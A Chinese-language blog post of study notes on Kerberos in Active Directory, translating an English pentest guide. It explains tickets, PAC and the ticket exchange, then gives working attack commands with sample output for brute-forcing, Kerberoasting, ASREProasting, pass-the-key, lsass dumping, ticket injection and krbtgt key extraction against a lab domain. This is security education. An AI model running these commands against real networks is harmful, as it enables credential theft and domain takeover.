---
layout: article
title: Kerberos--AD from 0 to 0.9 part 6
mathjax: true
key: a00010
cover: /bkgs/1.png
modify_date: 2021-10-5
show_author_profile: true
excerpt_type: html
tag: 
- DC
- Pentest
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是AD from 0 to 0.9系列笔记的第六部分，主要是**Kerberos**相关<!--more-->

原文： [Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/#why-this-post) 

# **Kerberos**

## **Kerberos Basics**

Kerberos是AD推荐身份认证协议（工作组用不了），由[Kerberos SSP ](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos-ssp)实现，[RFC 4120 ](https://tools.ietf.org/html/rfc4120)有描述，在AD的拓展的文档[MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9)

Kerberos侧重于使用称为“票据”的令牌，该令牌允许用户根据主体进行身份验证。

### Kerberos principals

 [Kerberos principals](https://datatracker.ietf.org/doc/html/rfc4120#section-6.2)最常见的就是users and [services](https://zer1t0.gitlab.io/posts/attacking_ad/#services)，而服务又是其中最常见的；

要请求服务的票据，必须指定其SPN，例如HTTP/computer，有几种Kerberos主体类型可用于请求服务：NT-SRV-INST, NT-SRV-HST or NT-SRV-XHST

主体也能代表用户，事实上，它们通常用于指示请求票据的客户端的名称，用户通常由SamAccountName （如“foo”）表示，使用NT-PRINCIPAL类型。

也有 [NT-ENTERPRISE type ](https://swarm.ptsecurity.com/kerberoasting-without-spns/)，允许更明确的格式来识别用户，像SamAccountName@DomainFQDN （e.g "foo@contoso.local")

也可以用用户主体作为凭证的目标， [Kerberoast](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberoast) attack [without knowing the services of users](https://swarm.ptsecurity.com/kerberoasting-without-spns/). 的时候能用上

###  **Tickets**

票据是部分加密的结构，包含：

- 票据适用的目标主体（通常为服务）
- 与客户端相关的信息，如名字或域
- 在C/S间建立安全通道的密钥
- 决定票据期限的时间戳

```asn1
###Ticket definition
		Ticket          ::= [APPLICATION 1] SEQUENCE {
        tkt-vno         [0] INTEGER (5),
        realm           [1] Realm,
        sname           [2] PrincipalName, -- Usually the service SPN
        enc-part        [3] EncryptedData -- EncTicketPart
}

EncTicketPart   ::= [APPLICATION 3] SEQUENCE {
        flags                   [0] TicketFlags,
        key                     [1] EncryptionKey, -- Session Key
        crealm                  [2] Realm,
        cname                   [3] PrincipalName,
        transited               [4] TransitedEncoding,
        authtime                [5] KerberosTime,
        starttime               [6] KerberosTime OPTIONAL,
        endtime                 [7] KerberosTime,
        renew-till              [8] KerberosTime OPTIONAL,
        caddr                   [9] HostAddresses OPTIONAL,
        authorization-data      [10] AuthorizationData OPTIONAL -- Includes a PAC
}
```

#### PAC

除了常规票据数据外，Kerberos的AD实现通常在 authorization-data票据字段中包含AD身份验证中的一个重要结构：PAC。

 [PAC](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962) (Privilege Attribute Certificate,特权属性证书) 包含于客户端相关的[security information](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-7d969cd0ed73)：

- 客户端域：包含域名和[SID](https://zer1t0.gitlab.io/posts/attacking_ad/#sid) (分别为LogonDomainName and     LogonDomainId )
- 客户端用户：用户名和用户 [RID ](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_df3d0b61-56cd-4dac-9402-982f1fedc41c)（分别为EffectiveName and     UserId）
- 客户端组：用户属于的域组的 [RIDs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_df3d0b61-56cd-4dac-9402-982f1fedc41c) (GroupIds)
- 其他组：PAC包括引用非域组的其他 [SIDs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/78eb9013-1c3a-4970-ad1f-2b1dad588a25) (ExtraSids)     ，可以适用于域间认证，以及用于指示特殊特征的众所周知的SID。

PAC除了包括用户信息外还有[several signatures](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/6e95edd3-af93-41d4-8303-6c7955297315)用来验证PAC和票据数据的完整性：

- [Server      signature ](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/a194aa34-81bd-46a0-a931-2e05b87d1098)：用与加密票据相同密钥生成的PAC内容的签名
- [KDC      signature ](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/3122bf00-ea87-4c3f-92a0-91c0a99f5eec)： 使用KDC密钥生成的服务器签名的签名。用来验证PAC是由KDC生成的并预防 [Silver      ticket](https://zer1t0.gitlab.io/posts/attacking_ad/#golden-silver-ticket) attacks，但并没有检查
- [Ticket      signature](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/76c10ef5-de76-44bf-b208-0d8750fc2edd)：使用KDC密钥创建的票据内容的签名，该签名最近才出现，来预防[Bronze      bit attack](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)

### Ker**beros  actors（**参与者？）

Kerberos使用票据对用户进行服务身份验证，但是它们是如何使用的呢？首先得知道Kerberos认证涉及哪些参与者

第一个是客户端，接收票据并使用票据访问域（或林）中服务

第二个是服务，在Kerberos通常是AP (Application Server)，提供服务的机器，AP可以是域中任意计算机

最后一个是KDC(Key Distribution Center)，提供票据给用户，AD中KDC就是DC，因为它可以访问验证用户所需的域 [database](https://zer1t0.gitlab.io/posts/attacking_ad/#database) 

（Kerberos 中TGTs由认证服务/服务器（AS）提供，STs由Ticket-Granting Service/Server (TGS)提供。两个服务都要请求KDC的Kerberos密钥，然而，由于所有这些服务通常都在同一台服务器上运行，为了简单起见，我们将它们称为KDC）

### **Ticket types**

Kerberos 有两种票据，ST 和 TGT：

#### ST

**STs** (Service tickets)，客户端拿它来给AP/service/principal 来访问它们，KDC为请求STs的客户端发出STs

（**STs在很多地方TGSs**，但[rfc4120 ](https://datatracker.ietf.org/doc/html/rfc4120/)表示TGS 代表提供服务票据的服务，即授予服务的票证还是授予票证的服务，有一些歧义）

在AD中客户端可以拿到任何注册在域数据库的服务的ST，不管用户能否访问到该服务（Kerberos不处理身份认证）还是说服务运行与否。

STs应该被目标主体/服务读取，因为它们包括需要认证的客户机信息以及与客户机建立连接的会话密钥，因此STs由目标主体的密钥加密

对于AD，目标主体通常是服务，服务属于用户账户（或计算机账户，在AD也是用户（的子类））。TGTs由服务账户拥有者的密钥加密

由此我们能总结：

首先，如果有目标主体的密钥（从密码派生）就能伪造主体的票据，对于AD，如果我们知道用户密钥，就能伪造自定义票据访问该用户的任意服务，这些自定义票据也叫 [Silver ticket](https://zer1t0.gitlab.io/posts/attacking_ad/#golden-silver-ticket)

比如，如果知道计算机账户的密码（存在机器的 [LSA Secrets](https://zer1t0.gitlab.io/posts/attacking_ad/#lsa-secrets)里），就可以为机器[SMB](https://zer1t0.gitlab.io/posts/attacking_ad/#smb) 服务创建白银票据然后像admin一样访问机器。

然而，票据PAC的KDC签名是用KDC密钥签名的，因此我们不能伪造真的票据，不过KDC签名并不被服务所检查

第二点，如果数个服务属于一个用户，他们会被用一个密钥加密，你可以用此信息以及在票据的未加密部分（sname字段）中指定票据的目标服务这一事实。因此，如果您将票据的目标服务更改为同一用户的另一服务， [ticket will work ](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/)在新的目标服务上。

举例：如果你能为admin获取A机器（SPN=MSSQLSvc\machineA）中MSSQL数据库的ST，则可以修改服务以指向同一台机器的SMB服务（SPN=CIFS\machineA）并访问A机器

#### TGT

为了从KDC获得ST，用户需要提供另一种类型的票证，TGT（Ticket Granting Ticket）。TGT类似于KDC的ST（仅此而已）

实际上，按照只允许目标主体访问票据的原则，所有TGT都使用域的krbtgt 帐户的密钥（称为KDC密钥）进行加密，因此你可以取出krbtgt 的密钥（存在 [domain database](https://zer1t0.gitlab.io/posts/attacking_ad/#domain-database-dumping)），可以创建自定义TGTs，即[Golden tickets](https://zer1t0.gitlab.io/posts/attacking_ad/#golden-silver-ticket)；由此能伪造域中任何用户身份，黄金票据甚至能[compromise the entire forest ](https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)，只需在PAC设置特殊特权SID如[Enterprise Admins](https://zer1t0.gitlab.io/posts/attacking_ad/#administrative-groups)

之所以可以这样做，是因为PAC包含与用户相关的安全数据，并且不会验证信息是否真实（至少在票证存在20分钟之前），因此您可以将任何用户添加到票证内的任何组，甚至可以为不存在的用户创建票证

要拿到TGT通常需要用KDC的凭证来认证用户身份

### **Ticket acquisition**

了解STs和TGTs后，可以进一步了解[how Kerberos works ](https://www.tarlogic.com/en/blog/how-kerberos-works/)或者说[how tickets are issued](https://syfuhs.net/a-bit-about-kerberos)

```
 ###Kerberos process
                             KDC (DC)
   .----->-1) AS-REQ------->   .---.
   |                          /   /| -------8] PAC Response-----------.
   | .--<-2) AS-REP (TGT)--< .---. |                                  |
   | |                       |   | '                                  |
   | | .>-4) TGS-REQ (TGT)-> |   |/  <-7] KERB_VERIFY_PAC_REQUEST-.   |
   | | |                     '---'                                |   |
   | | | .<-5) TGS-REP (ST)--<'                                   |   |
   | | | |                                                        |   v
   | v | v                                                        ^   
   ^   ^                                                          .---.
    _____                                                        /   /|
   |     |   <----3) Authentication negotiation (SPNEGO)---->   .---. |
   |_____|                                                      |   | '
   /:::::/   >-------------------6) AP-REQ (ST)------------->   |   |/ 
   client                                                       '---'  
             <-------------------9] AP-REP------------------<  AP (service)
```

1.客户端发送[AS-REQ](https://tools.ietf.org/html/rfc4120#section-5.4.1)信息向AS (KDC)请求TGT ，AS-REQ可以包含用自己的Kerberos密钥加密的时间戳，这叫做Kerberos  [preauthentication ](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961961(v=technet.10)?redirectedfrom=MSDN)且[sometimes is not required](https://en.hackndo.com/kerberos-asrep-roasting/)

2.AS (KDC) 检查时间戳（也不一定）然后回复 [AS-REP](https://tools.ietf.org/html/rfc4120#section-5.4.2) 信息，包含两个加密部分：用KDC密钥加密的TGT以及用客户端密钥加密的客户端数据。像会话密钥这样的信息会被复制在两个部分，即用户和KDC会分享这些信息

3.然后客户端与AP中的一个服务连接，并与SPNEGO协商身份验证协议，如果选择Kerberos，则客户端需要为目标服务获取ST

4.因此，客户端发送 [TGS-REQ](https://tools.ietf.org/html/rfc4120#section-5.4.1) （包含其TGT和目标服务的 [SPN](https://en.hackndo.com/service-principal-name-spn/) ）向KDC请求ST，还发送使用会话密钥加密的数据，如客户端用户名和时间戳，以验证连接

5.KDC使用其密钥解密TGT来读用户名和会话密钥，并用会话密钥解密用户发送的用户名以验证其正确性

如果检查完毕，KDC回复一个[TGS-REP](https://tools.ietf.org/html/rfc4120#section-5.4.2)，包含两部分，使用服务用户密钥加密的目标服务的ST，和使用会话密钥加密的客户端数据，像会话密钥这样的信息会被复制在两个部分，即用户和服务会分享这些信息

6.客户端把ST放在 [AP-REQ](https://tools.ietf.org/html/rfc4120#section-5.5.1) （应用协议里面)发给服务。服务解密ST然后拿到服务会话密钥和PAC，服务会用PAC有关客户端的安全信息来决定用户是否有权限访问服务资源

7.（可选）如果服务要 [validate the PAC](https://docs.microsoft.com/en-us/archive/blogs/openspecification/understanding-microsoft-kerberos-pac-validation)，可以用Netlogon 协议请求DC用[KERB_VERIFY_PAC_REQUEST ](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/b27be921-39b3-4dff-af4a-b7b74deb33b5)检查PAC签名

8.（可选）服务器会检查PAC并响应code(一段代码?)指示PAC正确

9.（可选）最后，如果客户端需要，服务必须通过使用AP-REP消息响应AP-REQ消息并使用会话密钥证明服务可以解密ST，从而证明ST是真正的服务而不是伪造的服务来验证自身

可以看出，Kerberos具有其他应用程序协议中不包含的消息。直接发送到DC的AS-REQ和TGS-REQ就是这种情况

### **Kerberos services**

DC 在 88/TCP and 88/UDP 监听Kerberos

```
                           .-----
                           |
                         .---
            .----KDC---> | 88
            |            '---   Domain
 Kerberos --|              |
            |            .---  Controller
            '-kpasswd--> | 464
                         '---
                           |
                           '-----
```

Kerberos除了KDC以外还有一个服务叫[kpasswd ](https://tools.ietf.org/html/rfc3244.html)，能允许改变域用户的密码，kpasswd 在DC的464/TCP and 464/UDP，可以与实用程序 [ksetup](https://docs.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup-changepassword)一起使用（从CTRL+ALT+DEL“更改密码”屏幕），或与 [Rubeus changepw](https://github.com/GhostPack/Rubeus#changepw)一起使用

### **Kerberos keys**

通过更改密码，用户可以更改用于加密Kerberos消息和票据的Kerberos密钥。

 [encryption algorithm ](https://web.mit.edu/kerberos/kfw-4.1/kfw-4.1/kfw-4.1-help/html/encryption_types.htm#supported)不同，能生成不同的密钥，算法如下：

- RC4-HMAC:RC4使用的密钥是用户的NT哈希。
- AES128-CTS-HMAC-SHA1-96：AES128使用的密钥是从用户密码（以及域和用户名）派生的16个字节的散列。
- AES256-CTS-HMAC-SHA1-96：AES256使用的密钥是从用户密码（以及域和用户名）派生的32字节散列。
- DES-CBC-MD5：此密钥已弃用，但密钥仍存储在用户的域数据库中。

AD一般会用AES256

（文中出现的Kerberos密钥一般指任意一个）

## **Kerberos basic attacks**

基础介绍完，开始 [Kerberos attacks](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)，攻击命令相关[Kerberos cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

### **Kerberos brute-force**

Kerberos 作为身份认证协议可以用来测试其他用户的凭证

而且Kerberos的错误能获得很多信息：

- KDC_ERR_PREAUTH_FAILED:     Incorrect password
- KDC_ERR_C_PRINCIPAL_UNKNOWN:     Invalid username
- KDC_ERR_WRONG_REALM:     Invalid domain
- KDC_ERR_CLIENT_REVOKED:     Disabled/Blocked user

可以测试有那些账户（但爆破可能会锁账户，注意）

失败记录不是[normal logon failure event](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) (code: 4625)，而是 [Kerberos pre-authentication failure](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771) (code: 4771)，默认情况下不会记录该事件

爆破工具：[Rubeus brute](https://github.com/GhostPack/Rubeus#brute), [kerbrute (Go)](https://github.com/ropnop/kerbrute), [kerbrute (Python)](https://github.com/TarlogicSecurity/kerbrute) or [cerbero](https://github.com/Zer1t0/cerbero#brute)

```bash
###Kerberos brute-force attack with kerbrute.py
$ python kerbrute.py -domain contoso.local -users users.txt -passwords passwords.txt -dc-ip 192.168.100.2
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Valid user => Anakin
[*] Blocked/Disabled user => Leia
[*] Valid user => Han [NOT PREAUTH]
[*] Valid user => Administrator
[*] Stupendous => Anakin:Vader1234!
[*] Saved TGT in Anakin.ccache
```

### **Kerberoast**

AD中，任何用户都可以通过 [SPN](https://zer1t0.gitlab.io/posts/attacking_ad/#services)为其在域数据库中注册的任何服务请求ST，而不管该服务是否正在运行

由于ST部分被用户Kerberos密钥加密（从密码派生），拿到ST就能解密来破解用户密码

大多数服务都是在机器帐户中注册的，机器帐户有自动生成的passwords of [120 characters that changes every month](https://adsecurity.org/?p=280)，因此破解它们的STs是不可行的

但是用户注册的服务通常是弱密码能破解

[Kerberoast attack](https://en.hackndo.com/kerberoasting/)包括对常规用户帐户服务的STs请求，并试图破解这些请求以获取用户密码，而且这些用户通常有高权限，很有价值

可以在任何LDAP客户端上使用SPN检查用户帐户，LDAP筛选器：

```ladp
###LDAP filter for users with SPNs
(&(samAccountType=805306368)(servicePrincipalName=*))
```

就是说 [impacket GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) script, the [Rubeus kerberoast](https://github.com/GhostPack/Rubeus#kerberoast) command, or the [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) script. 都能拿STs 以待破解

```bash
###Kerberoast with GetUserSPNs.py
root@debian10:~# GetUserSPNs.py 'contoso.local/Anakin:Vader1234!' -dc-ip 192.168.100.2 -outputfile kerberoast-hashes.txt
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name  MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
--------------------  ----  ---------------------------------------------  --------------------------  --------------------------  ----------
HTTP/ws01-10          leia  CN=Domain Admins,CN=Users,DC=contoso,DC=local  2021-01-01 16:38:02.183703  2021-01-15 11:46:13.998905             


root@debian10:~# cat kerberoast-hashes.txt 
$krb5tgs$23$*leia$CONTOSO.LOCAL$HTTP/ws01-10*$65ca3e856acd6d9438c05cb6c283dcb5$ab86cafcf1dee23d2466973679fc315e9fef3fa2ddcae82d844b31e1651ed.................
```

有了STs就能用 [hashcat](https://hashcat.net/hashcat/)破解 ， 请求RC4最好破解，但可以被检测为不正常流量（如 [Microsoft ATA](https://docs.microsoft.com/en-gb/advanced-threat-analytics/what-is-ata)），因为大部分请求都是AES256的

也可以 [Kerberoasting without knowing the services SPNs ](https://swarm.ptsecurity.com/kerberoasting-without-spns/)，记住可以为不同主体请求Kerberos票据，包括用户和服务的

用户得注册有服务才能请求它的票据

作为目标主体名称为用户获取的ST也使用用户密钥进行加密，也就能Kerberoasting，如果不能通过LDAP枚举用户的话这就很有用，因为没有SPN的用户的主体名称无法解析

这种方法被 [impacket GetUserSPNs.py ](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)所使用，[Rubeus kerberoast](https://github.com/GhostPack/Rubeus#kerberoast) 命令加/enterprise flag，以及[cerbero kerberoast](https://gitlab.com/Zer1t0/cerbero/#kerberoast) 命令也用

如果对某个用户账户有[Validated-SPN ](https://docs.microsoft.com/en-gb/windows/win32/adschema/r-validated-spn)权限，你可以给账户加SPNs 来让它能被Kerberoasting，可以为该帐户服务请求ST并尝试破解它。默认情况下，帐户本身没有经过验证的SPN权限。

### **ASREProast**

大多数用户都要Kerberos预认证，即在AS-REQ 信息中发送用它的Kerberos密钥加密的时间戳到KDC（来请求TGT）

但有很小的几率预认证被关闭（设置 [DONT_REQUIRE_PREAUTH flag](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)），谁都可以发送AS-REQ消息来伪装这些帐户，并且KDC将返回 [AS-REP response](https://tools.ietf.org/html/rfc4120#section-5.4.2) ，数据用用户Kerberos密钥加密

AS-REP数据不能直接拿，因为被用户密钥加密了，但离线破解能得到用户密码

**ASREProast 攻击包括识别不需要Kerberos预认证的用户，并以他们的名义发送AS-REQ来检索使用AS-REP消息中的用户密钥加密的数据段，然后离线破解得到用户密码**

```
###（LDAP filter for users without Kerberos pre-authentication）(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

工具： [impacket GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) script, the [Rubeus asreproast](https://github.com/GhostPack/Rubeus#asreproast) command or the [ASREPRoast.ps1](https://github.com/HarmJ0y/ASREPRoast) script 来拿AS-REP加密数据

```bash
$ GetNPUsers.py 'contoso.local/Anakin:Vader1234!' -dc-ip 192.168.100.2 -outputfile asreproast-hashes.txt
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
han             2020-12-16 10:53:35.177156  2021-05-12 09:19:28.469863  0x410200 

root@debian10:~# cat asreproast-hashes.txt 
$krb5asrep$23$han@CONTOSO.LOCAL:73eea4275625972c2e224648c4766b5a$1bbdaba56bb6eba4ea8cb565221d
```

有了用户TGT，就可以用hashcat破解它。可以请求使用RC4加密的AS-REP，以便更轻松地破解它

### **Pass the Key/Over Pass the Hash**

请求TGT不需要密码而是Kerberos密钥(NT hash or AES keys)

win里，Kerberos密钥通常缓存在lsass进程， [mimikatz sekurlsa::ekeys](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#ekeys)命令可以拿， [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sqldumper or others ](https://lolbas-project.github.io/#/dump)也可以 [dump the lsass process](https://www.c0d3xpl0it.com/2016/04/extracting-clear-text-passwords-using-procdump-and-mimikatz.html) 并用mimikatz离线提取密钥

Linux，在[keytab](https://web.mit.edu/kerberos/krb5-devel/doc/basic/keytab_def.html) 文件，在/etc/krb5.keytab，或在环境变量 KRB5_KTNAME or KRB5_CLIENT_KTNAME ，或在/etc/krb5.conf 的 [Kerberos configuration file](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html)， [klist](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/klist.html) (Kerberos MIT) or [cerbero ](https://gitlab.com/Zer1t0/cerbero/#list)可以拿到密钥

```text
###Reading keytab with klist
$ klist -k -Ke
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   1 r2d2@contoso.local (DEPRECATED:arcfour-hmac)  (0xc49a77fafad6d3a9270a8568fa453003)
```

拿到Kerberos密钥后请求TGT：

windows 用 [Rubeus asktgt](https://github.com/GhostPack/Rubeus#asktgt)

Linux 用 [MIT Kerberos utils ](https://malicious.link/post/2018/pass-the-hash-with-kerberos/)拿密钥创建keytab 再请求TGT，或者[impacket getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py) script or [cerbero ask](https://gitlab.com/Zer1t0/cerbero#ask) command 直接请求。

```bash
###Pass-The-Key with cerbero
$ cerbero ask -u contoso.local/Anakin --aes ecce3d24b29c7f044163ab4d9411c25b5698337318e98bf2903bbb7f6d76197e -k 192.168.100.2 -vv
INFO - Request contoso.local/Anakin TGT for contoso.local
INFO - Save contoso.local/Anakin TGT for contoso.local in /root/Anakin.ccache
```

Kerberos票据有两种格式：ccache and krb

| ccache | Linux存票据                                  |
| ------ | -------------------------------------------- |
| krb    | win在lsass存票据，网络中传输票据也是这个格式 |

转换格式可以用  [ticket_converter.py](https://github.com/Zer1t0/ticket_converter) script or [cerbero convert](https://gitlab.com/Zer1t0/cerbero#convert) command

```text
###Convert a ticket with ticket_converter.py
$ python ticket_converter.py ~/Anakin.ccache ~/Anakin.krb
Converting ccache => kirbi
```

 [cerbero hash](https://gitlab.com/Zer1t0/cerbero#hash) 能用密码算Kerberos密钥，[Get-KerberosAESKey.ps1 ](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)算AES密钥，[few python lines ](https://stackoverflow.com/questions/15603628/how-to-calculate-ntlm-hash-in-python#answer-15603809)算NT哈希

```bash
###Calculate Kerberos keys with cerbero
$ cerbero hash 'Vader1234!' -u contoso.local/Anakin
rc4:cdeae556dc28c24b5b7b14e9df5b6e21
aes128:18fe293e673950214c67e9f9fe753198
aes256:ecce3d24b29c7f044163ab4d9411c25b5698337318e98bf2903bbb7f6d76197e
```

### **Pass the Ticket**

流程包括偷票据，和会话密钥关联，用它们冒充用户来获得资源和服务。

TGTs and STs 都行，但TGTs 更好，因为能代表用户访问任意服务（通过用TGTs请求ST），STs只能一个服务（或多个，如果 [SPN is modified ](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/)到另一个同用户的服务）

Windows票据在 lsass 进程内存， [mimikatz sekurlsa::tickets](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#tickets) command or [Rubeus dump ](https://github.com/GhostPack/Rubeus#dump)能取，  [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sqldumper or others ](https://lolbas-project.github.io/#/dump)来dump lsass也行，mimikatz or [pypykatz ](https://github.com/skelsec/pypykatz)离线提取，格式为krb 

```powershell
###Dumping lsass memory with procdump
PS C:\> .\procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[12:03:17] Dump 1 initiated: C:\lsass.dmp
[12:03:18] Dump 1 writing: Estimated dump file size is 34 MB.
[12:03:18] Dump 1 complete: 34 MB written in 1.0 seconds
[12:03:18] Dump count reached.
```

```bash
###Retrieving tickets from lsass dump with pypykatz
$ pypykatz lsa minidump lsass.dmp -k /tmp/kerb > output.txt
INFO:root:Parsing file lsass.dmp
INFO:root:Writing kerberos tickets to /tmp/kerb
$ ls /tmp/kerb/
 lsass.dmp_51a1d3f3.ccache                                                        'TGS_CONTOSO.LOCAL_WS02-7$_WS02-7$_29a9c991.kirbi'
 lsass.dmp_c9a82a35.ccache                                                         TGT_CONTOSO.LOCAL_anakin_krbtgt_CONTOSO.LOCAL_6483baf5.kirbi
 TGS_CONTOSO.LOCAL_anakin_LDAP_dc01.contoso.local_contoso.local_f8a46ad5.kirbi    'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_740ef529.kirbi'
'TGS_CONTOSO.LOCAL_WS02-7$_cifs_dc01.contoso.local_b9833fa1.kirbi'                'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_77d63cf0.kirbi'
'TGS_CONTOSO.LOCAL_WS02-7$_cifs_dc01.contoso.local_bfed6415.kirbi'                'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_7ac74bd6.kirbi'
'TGS_CONTOSO.LOCAL_WS02-7$_ldap_dc01.contoso.local_contoso.local_2129bc1c.kirbi'  'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_fdb8b40a.kirbi'
'TGS_CONTOSO.LOCAL_WS02-7$_LDAP_dc01.contoso.local_contoso.local_719218c6.kirbi'
```

linux票据在/tmp，命名格式为krb5cc_%{uid}，直接复制即可，也可能存在[Linux kernel keys](https://man7.org/linux/man-pages/man7/keyrings.7.html)而不是文件，[tickey](https://github.com/TarlogicSecurity/tickey)可以取出；要确定linux机器上[where the tickets are stored](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)，可以在`/etc/krb5.conf`检查 [Kerberos configuration file](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html)，Linux上这些票据以[ccache format](https://web.mit.edu/kerberos/krb5-devel/doc/formats/ccache_file_format.html)存储

要[use the tickets in a Windows](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-windows)，得注入票据到lsass进程，[mimikatz kerberos::ptt](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#ptt) command or [Rubeus ptt](https://github.com/GhostPack/Rubeus#ptt) command 可以做到

```powershell
###Inject TGT into current Windows session
PS C:\> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::ptt pikachu-tgt.kirbi

 * File: 'pikachu-tgt.kirbi': OK
```

票据注入到会话后就能伪造用户行为了，工具[psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

Linux ，设置`KRB5CCNAME` 环境变量为票据文件 ， [use the tickets](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-linux) with the [impacket utilities](https://github.com/SecureAuthCorp/impacket/tree/master/examples)，再用 impacket utilities with the `-k -no-pass` 参数

 [ticket_converter.py](https://github.com/Zer1t0/ticket_converter) script or [cerbero convert ](https://gitlab.com/Zer1t0/cerbero#convert)能换票据格式格式

### **Golden/Silver ticket**

In AD里Kerberos TGTs 用krbtgt 账户密钥加密，如果知道这些密钥，就能创建自定义TGTs即 [Golden Tickets ](https://en.hackndo.com/kerberos-silver-golden-tickets/#golden-ticket)**。**

拿 krbtgt 密钥就得访问AD数据库；比如用 [mimikatz lsadump::dsync](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#dcsync) command or the [impacket secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) script远程 [dcsync attack ](https://adsecurity.org/?p=1729)， 或者[dumping the NTDS.dit file](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-ntdsutil) locally with [ntdsutil](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)) or [vssadmin ](https://docs.microsoft.com/en-gb/windows-server/administration/windows-commands/vssadmin)

```bash
###krbtgt keys retrieved with secretsdump.py
$ secretsdump.py 'contoso.local/Administrator@192.168.100.2' -just-dc-user krbtgt
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe8b03404a4975e7226caf6162cfccba:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
